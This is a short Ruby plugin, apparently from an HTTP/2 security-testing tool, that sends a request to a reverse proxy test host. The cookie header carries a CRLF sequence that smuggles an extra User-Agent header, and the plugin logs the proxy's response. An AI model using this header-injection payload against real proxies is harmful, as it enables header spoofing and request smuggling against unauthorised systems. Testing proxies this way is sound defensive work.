class ReverseProxyHeaderInjection < ServerPlugin
  def name
    'Reverse Proxy Header Injection'
  end

  def run(client)
    head = {
        ':scheme' => 'https',
        ':method' => 'GET',
        ':authority' => 'nginx.mi1.nz:443',
        ':path' => '/',
        'cookie' => "test=one\r\nUser-Agent: httpbreaker"
    }

    $stream = $conn.new_stream

    $stream.on(:close) do
      $server_log << { direction: 'info', message: 'stream closed' }
    end

    $stream.on(:half_close) do
      $server_log << { direction: 'info', message: 'closing client-end of the stream' }
    end

    $stream.on(:headers) do |h|
      $server_log << { direction: 'inbound', message: "Response headers: #{h}" }
    end

    $stream.on(:data) do |d|
      $server_log << { direction: 'inbound', message: "Response data chunk: #{d}" }
    end

    $stream.headers(head, end_stream: true)
  end
end
